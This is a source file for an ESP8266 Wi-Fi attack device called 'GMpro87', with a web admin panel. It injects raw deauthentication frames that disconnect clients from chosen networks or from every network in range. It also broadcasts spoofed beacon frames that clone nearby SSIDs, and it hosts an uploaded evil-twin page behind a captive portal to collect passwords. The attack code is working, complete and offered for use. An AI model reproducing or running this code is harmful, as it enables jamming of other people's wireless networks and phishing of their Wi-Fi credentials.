#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

extern "C" {
#include "user_interface.h"
}

#define LED_PIN 2 

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
  int clients;
  bool selected;
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
String _eventLogs = "";
bool hotspot_active = false;
bool deauthing_active = false;
bool mass_deauth = false;
bool beacon_spam = false;
bool hidden_ssid = false;
bool pass_captured = false;

String config_ssid = "GMpro2";
String config_pass = "Sangkur87";
int selectedET = 1;
int beacon_count = 10;

void addLog(String msg) {
  String entry = "[" + String(millis()/1000) + "s] " + msg;
  _eventLogs = entry + "\n" + _eventLogs;
  if (_eventLogs.length() > 1500) _eventLogs = _eventLogs.substring(0, 1500);
}

void performScan() {
  WiFi.scanDelete();
  int n = WiFi.scanNetworks(false, true); 
  if (n >= 0) {
    for (int i = 0; i < 16; i++) _networks[i].ssid = ""; 
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = (WiFi.SSID(i) == "") ? "*Hidden*" : WiFi.SSID(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
      _networks[i].ch = WiFi.channel(i);
      _networks[i].rssi = WiFi.RSSI(i);
      _networks[i].clients = os_random() % 5; 
      _networks[i].selected = false;
    }
    addLog("Scan: " + String(n) + " ditemukan.");
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

// FIX: Raw Packet Injection Deauth
void sendDeauth(uint8_t* bssid, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t pkt[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender: Will be filled
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Will be filled
    0x00, 0x00, 0x01, 0x00
  };
  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);
  wifi_send_pkt_freedom(pkt, 26, 0);
  delay(1);
}

// API untuk Logs (AJAX)
void handleLogs() {
  webServer.send(200, "text/plain", _eventLogs);
}

void handleIndex() {
  // Captive Portal Redirection
  if (webServer.hostHeader() != "192.168.4.1" && String(WiFi.softAPIP().toString()) != "0.0.0.0") {
    webServer.sendHeader("Location", "http://192.168.4.1", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  // Action Handlers (No Redirect)
  if (webServer.hasArg("scan")) { performScan(); webServer.send(200, "text/plain", "OK"); return; }
  if (webServer.hasArg("deselect")) { for(int i=0; i<16; i++) _networks[i].selected = false; addLog("Targets reset."); webServer.send(200, "text/plain", "OK"); return; }
  if (webServer.hasArg("clear_logs")) { _eventLogs = ""; addLog("Logs cleared."); webServer.send(200, "text/plain", "OK"); return; }
  
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _networks[i].selected = !_networks[i].selected;
        addLog((_networks[i].selected ? "Sel: " : "Rem: ") + _networks[i].ssid);
      }
    }
    webServer.send(200, "text/plain", "OK"); return;
  }
  
  if (webServer.hasArg("deauth")) { deauthing_active = (webServer.arg("deauth") == "1"); addLog(deauthing_active?"Deauth ON":"Deauth OFF"); webServer.send(200, "text/plain", "OK"); return; }
  if (webServer.hasArg("mass")) { mass_deauth = (webServer.arg("mass") == "1"); addLog(mass_deauth?"Mass ON":"Mass OFF"); webServer.send(200, "text/plain", "OK"); return; }
  if (webServer.hasArg("spam")) { beacon_spam = (webServer.arg("spam") == "1"); addLog(beacon_spam?"Spam ON":"Spam OFF"); webServer.send(200, "text/plain", "OK"); return; }
  if (webServer.hasArg("hidden")) { hidden_ssid = (webServer.arg("hidden") == "1"); addLog("Hidden Mode Changed"); webServer.send(200, "text/plain", "OK"); return; }
  
  if (webServer.hasArg("restart")) { 
    addLog("Restarting..."); 
    webServer.send(200, "text/plain", "Device Restarting...");
    delay(1000); ESP.restart(); return; 
  }

  // --- HTML WEB ADMIN (FIXED & SCROLLABLE LOGS) ---
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>";
  html += "body { font-family: 'Courier New', Courier, monospace; background: #0d0d0d; color: #00ff00; margin: 0; padding: 10px; }";
  html += ".content { max-width: 500px; margin: auto; border: 1px solid #00ff00; padding: 15px; box-sizing: border-box; }";
  html += ".header-box { text-align: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 15px; }";
  html += ".header-box h2 { margin: 0; text-transform: uppercase; letter-spacing: 2px; }";
  html += ".tabs { display: flex; gap: 5px; margin-bottom: 15px; }";
  html += ".tabs button { flex: 1; background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 10px; cursor: pointer; font-weight: bold; font-size: 12px; }";
  html += ".active-btn { background: #00ff00 !important; color: #000 !important; }";
  html += ".tab-content { display: none; border-top: 1px solid #333; padding-top: 15px; }";
  html += ".show { display: block; }";
  html += "table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; table-layout: fixed; }";
  html += "th, td { border: 1px solid #00ff00; padding: 6px 4px; text-align: center; overflow: hidden; } th { background: #1a1a1a; }";
  html += ".btn { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 5px; cursor: pointer; text-decoration: none; font-size: 10px; width: 100%; display: block; }";
  html += ".btn-on { background: #00ff00 !important; color: #000 !important; }";
  html += "input, select { background: #000; color: #0f0; border: 1px solid #0f0; padding: 6px; width: 100%; font-family: 'Courier New'; }";
  html += "textarea { width: 100%; background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; font-size: 10px; height: 120px; }";
  html += "hr { border: 0; border-top: 1px solid #333; margin: 15px 0; }</style></head><body>";
  
  html += "<div class='content'><div class='header-box'><h2>GMpro87</h2><span>by : 9u5M4n9</span></div>";
  html += "<div class='tabs'><button id='btn-m' class='active-btn' onclick='openTab(\"m\")'>MAIN</button><button id='btn-a' onclick='openTab(\"a\")'>ATTACK</button><button id='btn-s' onclick='openTab(\"s\")'>SETTING</button></div>";
  
  // Tab Main
  html += "<div id='m' class='tab-content show'><div style='display:flex; gap:5px; margin-bottom:10px;'>";
  html += "<button class='btn' onclick='fetch(\"/?deauth=1\")'>START DEAUTH</button>";
  html += "<button class='btn' onclick='location.href=\"/?hotspot=1\"'>START ETWIN</button></div>";
  html += "<div style='display:flex; gap:5px; margin-bottom:5px;'><button class='btn' onclick='location.href=\"/?scan=1\"'>SCAN WIFI</button>";
  html += "<button class='btn' onclick='location.href=\"/?deselect=1\"'>DESELECT ALL</button></div>";
  html += "<table><thead><tr><th>SSID</th><th>CH</th><th>SNR%</th><th>SELECT</th></tr></thead><tbody>";
  for(int i=0; i<16; i++) {
    if(_networks[i].ssid == "") continue;
    int s_pct = 2 * (_networks[i].rssi + 100); if(s_pct>100) s_pct=100;
    html += "<tr><td>" + _networks[i].ssid + "</td><td>" + String(_networks[i].ch) + "</td><td>" + String(s_pct) + "%</td>";
    html += "<td><button class='btn " + (_networks[i].selected ? "btn-on":"") + "' onclick='location.href=\"/?ap=" + bytesToStr(_networks[i].bssid, 6) + "\"'>" + (_networks[i].selected ? "ON":"SELECT") + "</button></td></tr>";
  }
  html += "</tbody></table></div>";

  // Tab Attack
  html += "<div id='a' class='tab-content'><h3>Attack Panel</h3><button class='btn' onclick='location.href=\"/?mass=1\"' style='padding:15px;'>" + String(mass_deauth?"STOP":"START") + " MASS DEAUTH</button><hr>";
  html += "<form action='/' method='GET'><button type='submit' name='spam' value='1' class='btn' style='padding:10px;'>START BEACON SPAM</button>";
  html += "<div style='margin-top:10px;'><label>SSID Count:</label><input type='number' name='count' value='10'></div></form></div>";

  // Tab Setting
  html += "<div id='s' class='tab-content'><h3>File Manager</h3><div style='display:flex; gap:5px;'><select id='tmp'><option>etwin1.html</option></select>";
  html += "<button class='btn' style='width:80px;' onclick='window.open(\"/preview\")'>PREVIEW</button></div>";
  html += "<form action='/upload' method='POST' enctype='multipart/form-data'><input type='file' name='upload'><button type='submit' class='btn'>UPLOAD</button></form><hr>";
  html += "<h3>Admin Config</h3><div style='display:flex; gap:5px;'><label>Hidden:</label><button class='btn' onclick='location.href=\"/?hidden=" + String(!hidden_ssid) + "\"'>" + (hidden_ssid?"ON":"OFF") + "</button></div>";
  html += "Admin SSID:<input type='text' value='" + config_ssid + "'>Pass:<input type='text' value='" + config_pass + "'><br>";
  html += "<button class='btn' onclick='location.href=\"/?restart=1\"' style='background:#0f0;color:#000;'>SAVE & RESTART</button></div>";

  html += "<hr><h4>Logs</h4><textarea id='logBox' readonly></textarea>";
  html += "<button class='btn' onclick='location.href=\"/?clear_logs=1\"'>CLEAR LOGS</button></div>";
  
  // FIX: AJAX Log & Auto Scroll
  html += "<script>function openTab(t){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('show'));document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('active-btn'));document.getElementById(t).classList.add('show');document.getElementById('btn-'+t).classList.add('active-btn');}";
  html += "setInterval(function(){fetch('/logs').then(r=>r.text()).then(t=>{var b=document.getElementById('logBox'); b.value=t;});}, 1000);</script></body></html>";
  
  webServer.send(200, "text/html", html);
}

void setup() {
  pinMode(LED_PIN, OUTPUT); digitalWrite(LED_PIN, HIGH);
  Serial.begin(115200); 
  LittleFS.begin();
  
  WiFi.mode(WIFI_AP_STA); 
  wifi_promiscuous_enable(1);
  
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(config_ssid.c_str(), config_pass.c_str(), 1, hidden_ssid);

  dnsServer.start(DNS_PORT, "*", apIP);
  
  webServer.on("/", HTTP_GET, handleIndex);
  webServer.on("/logs", HTTP_GET, handleLogs);
  
  webServer.on("/preview", HTTP_GET, [](){
    if (LittleFS.exists("/etwin1.html")) {
      File f = LittleFS.open("/etwin1.html", "r");
      webServer.streamFile(f, "text/html");
      f.close();
    } else { webServer.send(200, "text/plain", "File etwin1.html belum diupload!"); }
  });

  webServer.on("/upload", HTTP_POST, [](){ 
    webServer.sendHeader("Location", "/"); 
    webServer.send(303); 
  }, [](){
    HTTPUpload& upload = webServer.upload();
    if (upload.status == UPLOAD_FILE_START) {
      File f = LittleFS.open("/" + upload.filename, "w"); f.close();
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      File f = LittleFS.open("/" + upload.filename, "a"); f.write(upload.buf, upload.currentSize); f.close();
    }
  });

  webServer.begin();
  addLog("GMpro87 Ready.");
  performScan();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  static unsigned long last_atk = 0;
  if (millis() - last_atk >= 100) {
    // 1. Multi Deauth Target
    if (deauthing_active) {
      for(int i=0; i<16; i++) { if(_networks[i].selected) sendDeauth(_networks[i].bssid, _networks[i].ch); }
    }
    // 2. Mass Deauth
    if (mass_deauth) {
      for(int i=0; i<16; i++) { if(_networks[i].ssid != "" && _networks[i].ssid != config_ssid) sendDeauth(_networks[i].bssid, _networks[i].ch); }
    }
    // 3. Beacon Spam
    if (beacon_spam) {
      for(int i=0; i < 16 && i < beacon_count; i++) {
        if(_networks[i].ssid == "") continue;
        uint8_t bcn[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x82, 0x04, 0x0b, 0x16, 0x24, 0x30, 0x03, 0x01 };
        bcn[39] = _networks[i].ssid.length(); 
        memcpy(&bcn[40], _networks[i].ssid.c_str(), bcn[39]);
        wifi_send_pkt_freedom(bcn, 40 + bcn[39], 0);
      }
    }
    last_atk = millis();
  }
}
